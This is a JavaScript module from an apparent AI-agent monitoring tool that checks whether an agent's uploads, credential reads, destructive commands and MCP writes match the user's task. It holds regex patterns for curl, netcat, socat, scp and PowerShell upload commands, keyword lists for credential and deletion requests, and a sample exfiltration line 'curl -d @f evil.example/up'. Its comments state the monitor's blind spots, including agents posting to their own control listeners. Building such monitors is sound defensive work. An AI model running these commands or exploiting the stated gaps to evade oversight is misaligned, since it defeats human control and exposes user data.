// Intent alignment — pure part. Does a risky agent action fit the task the user gave in this session?
//
// Two halves, joined only through a keyed hash the caller supplies (cli/intent-alignment.mjs):
//   taskFeatures(prompt)          — what the user's request MENTIONS: sites, paths, known service names,
//                                   and a fixed three-word label set. Plaintext, in memory only; the
//                                   caller hashes every feature before anything is written.
//   actionTargets(tool, input, …) — whether a tool call is RISKY (moorai-control / egress / credentials /
//                                   destructive / mcp-write) and, if so, what it targets.
//   assessAlignment(task, action) — aligned iff the targets were mentioned (or, for credentials, destructive
//                                   and mcp-write, the task carries the matching label). moorai-control is
//                                   never aligned: an upload to MoorAI's own loopback listeners (moorai-serve,
//                                   the model proxy, the MCP gateway, at their default ports) is an agent
//                                   writing its own task (POST /v1/task) or driving the control that judges it,
//                                   whatever the task says. Uploads to any other loopback port stay out of
//                                   scope (a local dev server). A loopback host is recognised after
//                                   normalising it (loopbackHost), and a command that also uploads to a
//                                   remote host keeps those sites among the moorai-control targets.
//
// Deliberately lexical. It answers "did the user ever name this destination / file / service", not
// "does this action serve the task". An upload to a host the user named is aligned even when it is
// exfiltration to that host, and a request pasted from an untrusted source puts its hosts in scope.
// Browser-safe (no node: imports), like data/enforcement.js.

// A dotted token: a hostname, an email's domain, or a filename. Both readings are kept as features —
// an extra feature can only make an action look aligned, never flag one.
const DOTTED = /(?<![\w@-])(?:[a-z][a-z0-9+.-]{0,15}:\/\/)?(?:[^\s\/@'"`<>()]{1,64}@)?((?:[a-z0-9_](?:[a-z0-9_-]{0,62}[a-z0-9_])?\.)+[a-z0-9][a-z0-9-]{0,62})(?![\w-])/gi;
// `\` separates too, so a Windows path a user types ("clean C:\repo\build") yields features the
// PowerShell tool's Remove-Item operands can match.
// The lookbehind: an "@" inside a path-shaped run does not restart the path alternative when the run
// already had a start with no slash since (that start failed, and so would this one), unless a "~"
// follows. Was quadratic ("@" x 15k: 169ms; prompts are cut to 20k); same /g matches. See
// test/data-regex-redos.test.mjs.
const PATHISH = /(?:^|[\s"'`(=:@])((?:(?=~)|(?!~)(?<!(?:^|[\s"'`(=:@])~?[\w.@+-]*?@))(?:~|\.{1,2})?[\\/]?(?:[\w.@+-]+[\\/])+[\w.@+-]*|\.[\w][\w.-]*|[\w-]+\.[a-z0-9]{1,8})(?=$|[\s"'`),;:])/gi;

// Service names worth recognising in prose (they are also common MCP server names). A fixed vocabulary:
// hashing an arbitrary word of the prompt would amount to storing a hashed bag of words.
export const SERVICE_NAMES = new Set([
  "github", "gitlab", "bitbucket", "slack", "discord", "teams", "linear", "jira", "confluence", "notion",
  "asana", "trello", "sentry", "datadog", "pagerduty", "stripe", "vercel", "netlify", "heroku", "supabase",
  "firebase", "aws", "s3", "gcp", "gcs", "azure", "cloudflare", "figma", "gmail", "google", "drive",
  "calendar", "dropbox", "box", "salesforce", "hubspot", "zendesk", "intercom", "twilio", "sendgrid",
  "postgres", "mysql", "mongodb", "redis", "snowflake", "bigquery", "airtable", "docker", "kubernetes",
  "npm", "pypi", "huggingface", "openai", "anthropic", "email", "sheets", "docs", "filesystem", "browser"
]);

// The three label classes a task can carry. Egress deliberately has no label: an exfiltration
// destination is exactly the host the user never named, and "upload the build" does not name one.
const LABEL_RULES = {
  credentials: /\b(?:credential|secret|token|api[ _-]?keys?|passw(?:or)?d|\.env\b|env(?:ironment)? var|ssh[ -]?keys?|kube ?config|keychain|vault|certificate)/i,
  // Whole word forms, not stems: measured, the stem "clear" matched "clearer" and put a whole
  // session's rm -rf in scope.
  destructive: /\b(?:delet(?:e|es|ed|ing|ion)|remov(?:e|es|ed|ing|al)|clean(?:s|ed|ing|up)?|clear(?:s|ed|ing)?|reset(?:s|ting)?|wip(?:e|es|ed|ing)|drop(?:s|ped|ping)?|prun(?:e|es|ed|ing)|purg(?:e|es|ed|ing)|uninstall\w*|revert\w*|discard\w*|nuk(?:e|es|ed|ing)|truncat\w*|overwrit\w*|force[ -]push\w*)\b|\brm -/i,
  "mcp-write": /\b(?:send|post|publish|share|notify|email|message|comment|reply|tweet|open (?:a |an )?(?:pr|pull request|issue|ticket)|file (?:a |an )?(?:bug|issue|ticket)|create (?:a |an )?(?:pr|pull request|issue|ticket|page|doc|event)|merge|invite|schedule)/i
};
export const LABELS = Object.keys(LABEL_RULES);

const SLD = new Set(["co", "com", "org", "net", "gov", "ac", "edu", "ne", "or", "go", "gv"]);
const IPV4 = /^\d{1,3}(?:\.\d{1,3}){3}$/;
// Registrable-domain approximation (no public-suffix list): last two labels, or three under a
// two-letter country code with a generic second level (example.co.uk).
export function siteOf(host) {
  const h = String(host || "").toLowerCase().replace(/\.$/, "").replace(/^www\./, "");
  if (!h || IPV4.test(h) || h.startsWith("[")) return h;
  const l = h.split(".");
  if (l.length <= 2) return h;
  const n = l.length;
  return SLD.has(l[n - 2]) && l[n - 1].length === 2 ? l.slice(-3).join(".") : l.slice(-2).join(".");
}

const basename = (p) => String(p).replace(/[\\/]+$/, "").split(/[\\/]/).pop();
const normPath = (p) => String(p).replace(/^\.\//, "").replace(/[\\/]+$/, "");

export function taskFeatures(prompt) {
  const text = String(prompt || "").slice(0, 20000);
  const sites = new Set(), paths = new Set(), names = new Set(), labels = new Set();
  for (const m of text.matchAll(DOTTED)) { sites.add(siteOf(m[1])); paths.add(m[1]); }
  for (const m of text.matchAll(PATHISH)) {
    const p = normPath(m[1]);
    if (!p || /^[a-z][a-z0-9+.-]*:$/i.test(p)) continue;
    paths.add(p);
    const b = basename(p);
    if (b) paths.add(b);
  }
  for (const w of text.toLowerCase().match(/[a-z0-9]+/g) || []) if (SERVICE_NAMES.has(w)) names.add(w);
  for (const [l, re] of Object.entries(LABEL_RULES)) if (re.test(text)) labels.add(l);
  return { sites: [...sites], paths: [...paths], names: [...names], labels: [...labels] };
}

// ---- action side ----

// A copy or move whose operand is \\host\share. The host class excludes \\?\ and \\.\ (local device
// paths) and \\wsl$; localhost / wsl.localhost are dropped with the loopback hosts below.
const UNC_COPY = /\b(?:Copy-Item|cpi|copy|cp|Move-Item|mi|move|mv|robocopy|xcopy)\b[^\n;|&]*?[\s:]["']?\\\\[a-z0-9][\w.-]{0,252}\\/i;
const UNC_HOST = /(?:^|[\s:"'])\\\\([a-z0-9][\w.-]{0,252})\\/gi;
// A payload leaving the device. Same shape family as cli/hook-core.mjs OUTBOUND_UPLOAD (clipboard
// session rule), restricted to the forms that carry an explicit destination this module can read.
// The curl and scp lookbehinds: a command word may not start a match where the same word already
// started one earlier in the segment (no newline ; | & between) — that one failed, and this one can see
// no more. Was quadratic on "curl x " / "scp x " (170ms / 816ms at 60k, now under 0.3ms). Used with
// .test() only: same verdict. See test/data-regex-redos.test.mjs.
const UPLOAD = [
  /\bcurl\b(?<!\bcurl\b[^\n;|&]*?\bcurl)[^\n;|&]*?(?:\s-(?:[a-zA-Z]*d|F|T)\b|\s--(?:data(?:-binary|-raw|-urlencode|-ascii)?|form|upload-file|json)\b|\s-X\s*(?:POST|PUT|PATCH)\b|\s--request\s+(?:POST|PUT|PATCH)\b)/i,
  /\bwget\b[^\n;|&]*?--(?:post-data|post-file|body-data|body-file|method=(?:POST|PUT))/i,
  /\b(?:Invoke-RestMethod|Invoke-WebRequest|irm|iwr)\b[^\n;|&]*?(?:-Method\s+(?:Post|Put|Patch)|-InFile|-Body)\b/i,
  /\b(?:nc|ncat|netcat|socat|telnet)\b/i,
  // `[\w.-](?:[\w.-]*@)?[\w.-]+` is `[\w.-]+@?[\w.-]+` without the two runs overlapping ("scp a.a.a…"
  // was quadratic from a single start).
  /\b(?:scp|rsync|sftp)\b(?<!\b(?:scp|rsync|sftp)\b[^\n;|&]*?\b(?:scp|rsync|sftp))[^\n;|&]*?\s[\w.-](?:[\w.-]*@)?[\w.-]+:/i,
  // PowerShell: BITS in upload mode, and a copy/move onto a UNC share (SMB egress). Same shapes as
  // cli/hook-core.mjs PS_OUTBOUND_UPLOAD.
  /\bStart-BitsTransfer\b[^\n;|&]*?\s-TransferType\s{1,4}["']?Upload/i,
  UNC_COPY
];
// MoorAI's own loopback listeners, at the ports the code listens on by default: moorai-serve
// (cli/moorai-serve.mjs DEFAULTS.port), the model proxy (model-proxy/server.mjs DEFAULTS.port) and the MCP
// gateway (mcp-gateway/config.mjs DEFAULT_PORT); test/intent-alignment-control.test.mjs keeps them equal. One
// started on another port is not recognised.
export const MOORAI_PORTS = Object.freeze([8790, 8791, 8848]);
const MOORAI_PORT = new Set(MOORAI_PORTS.map(String));
// Where a command names host:port (any scheme's URL, socat's address), classified after normalising the host
// (loopbackHost below), never by its spelling.
const URL_HOSTPORT = /\b[a-z][a-z0-9+.-]{0,15}:\/\/(?:[^\s\/@'"]{0,200}@)?(\[[0-9a-f:.%]{1,64}\]|[^\s\/:'"?#`)\[\]]{1,253})(?::(\d{1,16}))?(?!\d)/gi;
const SOCAT_HOSTPORT = /\b(?:tcp[46]?|tcp[46]?-connect|openssl|openssl-connect|udp[46]?|udp[46]?-sendto|udp[46]?-connect):(\[[0-9a-f:.%]{1,64}\]|[^\s:,]{1,253}):(\d{1,16})(?!\d)/gi;
// IPv4 as inet_aton reads it: 1-4 parts, each decimal, 0x hex or 0-prefixed octal, the last part filling the
// bytes left (127.1, 2130706433, 0x7f.1, 0177.0.0.1). Returns the 32-bit value, or null.
function ipv4(h) {
  const parts = h.split(".");
  if (parts.length > 4) return null;
  const nums = [];
  for (const p of parts) {
    if (!p || p.length > 12) return null;
    const n = /^0x[0-9a-f]*$/i.test(p) ? parseInt(p.slice(2) || "0", 16) : /^0[0-7]*$/.test(p) ? parseInt(p, 8) : /^[1-9]\d*$/.test(p) ? Number(p) : NaN;
    if (!Number.isFinite(n)) return null;
    nums.push(n);
  }
  const last = nums.pop();
  if (nums.some((n) => n > 255) || last >= 2 ** (8 * (4 - nums.length))) return null;
  return nums.reduce((acc, n, i) => acc + n * 2 ** (8 * (3 - i)), 0) + last;
}
// IPv6 (brackets and a zone already removed) as 8 16-bit groups, a trailing dotted IPv4 allowed; or null.
function ipv6(h) {
  if (h.length > 64 || h.split("::").length > 2) return null;
  const [head, tail = null] = h.includes("::") ? h.split("::") : [h, null];
  const groups = (x) => (x ? x.split(":") : []);
  let a = groups(head), b = tail === null ? [] : groups(tail);
  const lastList = tail === null ? a : b;
  const last = lastList[lastList.length - 1];
  if (last && last.includes(".")) {
    const v = ipv4(last);
    if (v === null || last.split(".").length !== 4) return null;
    lastList.splice(-1, 1, ((v >>> 16) & 0xffff).toString(16), (v & 0xffff).toString(16));
  }
  if ([...a, ...b].some((g) => !/^[0-9a-f]{1,4}$/i.test(g))) return null;
  const fill = 8 - a.length - b.length;
  if (tail === null ? fill !== 0 : fill < 1) return null;
  return [...a, ...Array(tail === null ? 0 : fill).fill("0"), ...b].map((g) => parseInt(g, 16));
}
// Whether a host names this machine: localhost (and *.localhost), 127.0.0.0/8 or 0 in any IPv4 spelling, ::1,
// ::, and an IPv4-mapped or -compatible IPv6 address of either. A trailing dot and letter case are ignored.
// Bounded: at most 253 characters are looked at.
export function loopbackHost(host) {
  let h = String(host || "").toLowerCase();
  if (h.length > 253) return false;
  if (h.startsWith("[") && h.endsWith("]")) h = h.slice(1, -1).replace(/%.*$/, "");
  h = h.replace(/\.$/, "");
  if (h === "localhost" || h.endsWith(".localhost")) return true;
  const v4 = ipv4(h);
  if (v4 !== null) return v4 === 0 || v4 >>> 24 === 127;
  const g = h.includes(":") ? ipv6(h) : null;
  if (!g) return false;
  const v4tail = g[6] * 65536 + g[7];
  if (g.slice(0, 5).every((x) => x === 0) && (g[5] === 0xffff || g[5] === 0)) return g[5] === 0 && g[6] === 0 ? g[7] <= 1 : v4tail === 0 || v4tail >>> 24 === 127;
  return false;
}
// A port as written, leading zeros allowed (at most 16 digits are read): one of MOORAI_PORTS once it is a
// number of at most 65535.
const moorPort = (port) => { const n = port == null ? NaN : Number(port); return Number.isInteger(n) && n <= 65535 && MOORAI_PORT.has(String(n)); };
const NC_HOST = /\b(?:nc|ncat|netcat|telnet)\b(?:\s+-{1,2}[\w-]+(?:\s+\d+)?)*\s+([a-z0-9][\w.-]*\.[a-z][\w-]*|\d{1,3}(?:\.\d{1,3}){3})\b/gi;
const REMOTE_COPY = /(?:^|\s)(?:[\w.-]+@)?([a-z0-9][\w-]*(?:\.[\w-]+)+):/gi;
const SOCAT_HOST = /\btcp[46]?:([a-z0-9][\w.-]+):\d+/gi;

// curl and wget take their destination as a bare argument too (`curl -d @f evil.example/up`): every argument
// that is not a flag or a flag's value is a URL to them. The flags below take the NEXT argument as their value
// (an output file, a header, a user, form data …); a short cluster whose value letter is last (-sSd) does too,
// one with letters after it (-XPOST) carries its value. --url's value IS a destination. Quote-aware, linear in
// the command, at most MAX_ARGS arguments per command and MAX_SITES hosts.
const MAX_ARGS = 512, MAX_SITES = 64;
const CURL_SEG = /\b(curl|wget)\b([^\n;|&]*)/gi;
const VALUE_LONG = new Set(["--data", "--data-binary", "--data-raw", "--data-urlencode", "--data-ascii", "--json", "--form", "--form-string", "--upload-file",
  "--header", "--proxy-header", "--output", "--output-dir", "--request", "--user", "--proxy-user", "--user-agent", "--referer", "--cookie", "--cookie-jar",
  "--config", "--max-time", "--connect-timeout", "--write-out", "--proxy", "--cert", "--key", "--cacert", "--capath", "--resolve", "--connect-to",
  "--interface", "--limit-rate", "--range", "--continue-at", "--quote", "--oauth2-bearer", "--netrc-file", "--unix-socket", "--abstract-unix-socket",
  "--retry", "--retry-delay", "--retry-max-time", "--dump-header", "--trace", "--trace-ascii", "--stderr", "--variable", "--expand-url",
  "--output-document", "--post-data", "--post-file", "--body-data", "--body-file", "--method", "--execute", "--input-file", "--directory-prefix",
  "--password", "--http-user", "--http-password", "--append-output", "--output-file", "--tries", "--timeout", "--wait", "--level"]);
// Short flags that take a value, per tool (they differ: curl -O and -i take none, wget -O and -i do).
const VALUE_SHORT = { curl: new Set([..."AbcCdDeEFHKmoPQrtTuUwxXyYz"]), wget: new Set([..."oaOeiBtTwQUPlARDIX"]) };
const BARE = /^(?:[^\s\/@]{1,64}@)?(\[[0-9a-f:.%]{1,64}\]|[a-z0-9][a-z0-9-]{0,62}(?:\.[a-z0-9-]{1,63}){0,16}\.?)(?::(\d{1,16}))?(?:[\/?#]|$)/i;
function words(seg) {
  const out = [];
  let cur = "", q = "", has = false;
  for (const ch of seg) {
    if (q) { if (ch === q) q = ""; else cur += ch; continue; }
    if (ch === "'" || ch === '"') { q = ch; has = true; continue; }
    if (/\s/.test(ch)) { if (has || cur) { out.push(cur); if (out.length >= MAX_ARGS) return out; } cur = ""; has = false; continue; }
    cur += ch; has = true;
  }
  if (has || cur) out.push(cur);
  return out;
}
function bareTargets(command, add) {
  for (const m of String(command).matchAll(CURL_SEG)) {
    const short = VALUE_SHORT[m[1].toLowerCase()];
    const w = words(m[2]);
    for (let i = 0; i < w.length; i++) {
      const t = w[i];
      if (t === "--url") { if (i + 1 < w.length) add(w[++i], true); continue; }
      if (t.startsWith("--url=")) { add(t.slice(6), true); continue; }
      if (t.startsWith("--")) { if (!t.includes("=") && VALUE_LONG.has(t)) i++; continue; }
      if (t.startsWith("-") && t.length > 1) {
        const k = [...t.slice(1)].findIndex((c) => short.has(c));
        if (k >= 0 && k === t.length - 2) i++;
        continue;
      }
      add(t, false);
    }
  }
}

// nc / ncat / netcat / telnet: the first two arguments that are not flags (or a flag's value) are host and port.
const NC_SEG = /\b(?:nc|ncat|netcat|telnet)\b([^\n;|&]*)/gi;
const NC_VALUE = new Set([..."pswiqxXecOITVWGg"]);
function ncTargets(command, add) {
  for (const m of String(command).matchAll(NC_SEG)) {
    const w = words(m[1]), pos = [];
    for (let i = 0; i < w.length && pos.length < 2; i++) {
      const t = w[i];
      if (t.startsWith("-") && t.length > 1) { if (t.length === 2 && NC_VALUE.has(t[1])) i++; continue; }
      pos.push(t);
    }
    if (pos.length === 2 && /^\d{1,16}$/.test(pos[1])) add(pos[0], pos[1]);
  }
}
// The unknown destination: a bare curl / wget argument whose host is shell text this module cannot resolve
// ($VAR, $(…), `…`, a glob, a brace or a backslash). It has no dot, and every site a task yields has one
// (taskFeatures' DOTTED), so an action targeting it is never aligned: such an upload fails closed.
export const UNKNOWN_SITE = "unknown";
const SHELL_TEXT = /[$`*?\\{}()<>!|;]/;

// { hosts, control }: the remote hosts a command uploads to (loopback dropped, UNKNOWN_SITE for a destination
// that cannot be read), and the MoorAI loopback ports it uploads to ("loopback:<port>").
function egressTargets(command) {
  const c = String(command || "");
  const hosts = new Set(), control = new Set();
  const addHost = (h) => { if (hosts.size < MAX_SITES) hosts.add(h.toLowerCase()); };
  const hostPort = (host, port) => { if (loopbackHost(host)) { if (moorPort(port)) control.add(`loopback:${Number(port)}`); } else addHost(host); };
  for (const re of [NC_HOST, SOCAT_HOST]) for (const m of c.matchAll(re)) addHost(m[1]);
  if (/\b(?:scp|rsync|sftp)\b/i.test(c)) for (const m of c.matchAll(REMOTE_COPY)) addHost(m[1]);
  if (UNC_COPY.test(c)) for (const m of c.matchAll(UNC_HOST)) addHost(m[1]);
  for (const re of [URL_HOSTPORT, SOCAT_HOSTPORT]) for (const m of c.matchAll(re)) hostPort(m[1], m[2]);
  ncTargets(c, hostPort);
  bareTargets(c, (arg, url) => {
    if (!arg || (arg.startsWith("@") && !url)) return;
    let a = arg;
    const sch = a.indexOf("://");
    if (sch >= 0) { if (/^[a-z][a-z0-9+.-]{0,15}$/i.test(a.slice(0, sch))) a = a.slice(sch + 3); else { addHost(UNKNOWN_SITE); return; } }
    // The authority only: up to the path, the query or the fragment (a query's `?` is not a glob here).
    const auth = a.split(/[\/?#]/, 1)[0];
    if (SHELL_TEXT.test(auth) || (auth.includes("[") && !/^(?:[^\s\/@]{1,64}@)?\[[0-9a-f:.%]{1,64}\](?::\d{1,5})?$/i.test(auth))) { addHost(UNKNOWN_SITE); return; }
    const b = BARE.exec(auth);
    if (!b) { addHost(UNKNOWN_SITE); return; }             // an authority this module cannot read: fail closed
    const host = b[1].toLowerCase();
    if (loopbackHost(host)) { if (moorPort(b[2])) control.add(`loopback:${Number(b[2])}`); return; }
    if (url || host.includes(".") || host.startsWith("[")) addHost(host);
  });
  return { hosts: [...hosts].filter((h) => !loopbackHost(h) && h !== "wsl.localhost"), control: [...control] };
}

const MCP_WRITE = /(?:^|[_-])(?:create|update|delete|remove|send|post|write|push|publish|upload|comment|merge|add|edit|put|set|insert|close|reply|share|invite|move|rename|archive|transfer|execute|run|deploy|submit|patch)(?:[_-]|$)/i;

// Operands of a destructive command that look like paths (contain a slash or a dot, or are a bare
// word following rm/rmdir/shred). Flags and the command word itself are skipped.
function commandPaths(command) {
  const out = new Set();
  for (const tok of String(command || "").split(/[\s;|&()]+/)) {
    const t = tok.replace(/^['"@]+|['"]+$/g, "");
    if (!t || t.startsWith("-") || /^[a-z][a-z0-9+.-]*:\/\//i.test(t) || /[$`*?]/.test(t)) continue;
    if (/[\\/]/.test(t) || /\.\w/.test(t) || t.startsWith("~")) out.add(normPath(t));
  }
  return [...out];
}

// The ONE class an action is judged under, highest first. An upload that also reads a credential file
// is judged by where it goes: the destination is the question the task can answer.
export function actionTargets(tool, input, findings) {
  const ti = input || {};
  const ids = new Set((findings || []).map((f) => f && f.threatId));
  if (tool === "Bash" || tool === "PowerShell") {
    const cmd = String(ti.command || "");
    if (UPLOAD.some((r) => r.test(cmd))) {
      const { hosts, control } = egressTargets(cmd);
      const sites = [...new Set(hosts.map(siteOf))];
      // Both at once: judged as moorai-control (never aligned, the strictest), with the remote sites among its
      // targets, so each remote destination behind it is a target (an alert) of its own.
      if (control.length) return { cls: "moorai-control", sites: [...control, ...sites], paths: [], names: [] };
      if (sites.length) return { cls: "egress", sites, paths: [], names: [] };
    }
    if (ids.has(43)) return { cls: "destructive", sites: [], paths: commandPaths(cmd), names: [] };
    if (ids.has(55)) return { cls: "credentials", sites: [], paths: commandPaths(cmd), names: [] };
    return null;
  }
  if (tool === "Read") {
    if (!ids.has(55)) return null;
    const p = String(ti.file_path || "");
    return { cls: "credentials", sites: [], paths: p ? [normPath(p)] : [], names: [] };
  }
  if (typeof tool === "string" && tool.startsWith("mcp__")) {
    const [, server = "", name = ""] = tool.split("__");
    if (!MCP_WRITE.test(name)) return null;
    const words = server.toLowerCase().split(/[^a-z0-9]+/).filter(Boolean);
    return { cls: "mcp-write", sites: [], paths: [], names: [server.toLowerCase(), ...words] };
  }
  return null;
}

// Every feature is compared as h(`${kind}:${value}`) against the task's hashed set.
export function featureKeys(features, h) {
  const out = [];
  for (const s of features.sites || []) out.push(h(`site:${s}`));
  for (const p of features.paths || []) out.push(h(`path:${String(p).toLowerCase()}`));
  for (const n of features.names || []) out.push(h(`name:${n}`));
  for (const l of features.labels || []) out.push(h(`label:${l}`));
  return out;
}

export function assessAlignment(task, action, h) {
  if (action.cls === "moorai-control") return { aligned: false, unmatched: action.sites.length, targets: action.sites.length };
  const has = (k) => task.has(h(k));
  if (action.cls === "egress") {
    const unmatched = action.sites.filter((s) => !has(`site:${s}`));
    return { aligned: unmatched.length === 0, unmatched: unmatched.length, targets: action.sites.length };
  }
  const label = has(`label:${action.cls}`);
  const hit = action.paths.some((p) => has(`path:${p.toLowerCase()}`) || has(`path:${basename(p).toLowerCase()}`))
    || action.names.some((n) => has(`name:${n}`));
  const targets = action.paths.length + action.names.length;
  return { aligned: label || hit, unmatched: label || hit ? 0 : targets, targets };
}
